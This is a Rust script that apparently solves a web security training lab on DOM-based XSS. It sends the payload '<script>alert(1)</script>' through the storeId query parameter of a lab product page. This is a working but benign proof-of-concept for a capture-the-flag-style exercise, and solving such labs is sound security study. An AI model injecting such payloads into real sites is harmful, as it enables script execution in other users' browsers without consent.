/*********************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 18/11/2023
*
* Lab: DOM XSS in document.write sink using source location.search inside a select element
*
* Steps: 1. Inject payload in the storeId query parameter to call the alert function
*        2. Observe that the script has been executed
*
**********************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a9400f1049c185f81a4e85100f900b1.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // payload to call the alert function
    let payload = "<script>alert(1)</script>";

    print!(
        "{}",
        "❯❯ Injecting payload in the storeId query parameter to call the alert function.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .get(format!("{url}/product?productId=1&storeId={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
